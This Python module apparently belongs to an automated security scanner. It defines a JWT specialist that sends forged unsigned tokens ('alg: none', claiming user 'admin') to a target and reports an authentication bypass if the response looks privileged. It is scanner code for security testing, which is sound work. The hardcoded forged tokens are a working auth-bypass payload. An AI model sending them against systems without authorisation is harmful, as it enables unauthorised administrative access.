# agents/specialists/jwt_specialist.py
import logging
import uuid
from typing import List

import aiohttp

from agents.specialist_base import ISpecialist
from core.types import MultiSessionContext, TargetScope, VulnCategory
from triage.noise_filter import Finding

logger = logging.getLogger(__name__)


class JWTSpecialist(ISpecialist):
    """JSON Web Token (JWT) specialist agent."""

    @property
    def category(self) -> VulnCategory:
        return VulnCategory.JWT

    async def scan(
        self,
        target: str,
        scope: TargetScope,
        session_ctx: MultiSessionContext,
        correlation_id: str,
    ) -> List[Finding]:
        findings = []

        if await self.check_false_positive(target):
            return findings

        # Dummy algorithm none and key confusion tokens
        payloads = [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.signature",
        ]

        async with aiohttp.ClientSession() as session:
            for p in payloads:
                try:
                    # Send custom token in Authorization header
                    async with session.get(
                        target,
                        headers={"Authorization": f"Bearer {p}"},
                        timeout=10,
                    ) as response:
                        body = await response.text()
                        if response.status == 200 and "admin" in body:
                            finding = Finding(
                                finding_id=f"jwt_{uuid.uuid4().hex[:8]}",
                                title="JWT Algorithm None Vulnerability confirmed",
                                description="Able to authenticate as admin using alg:none signature bypass.",
                                vuln_category=self.category.value,
                                endpoint=target,
                                evidence={
                                    "payload": p,
                                    "status": response.status,
                                },
                                confidence=0.9,
                            )
                            findings.append(finding)
                except Exception as e:
                    logger.warning(f"Error requesting {target}: {e}")

        return findings
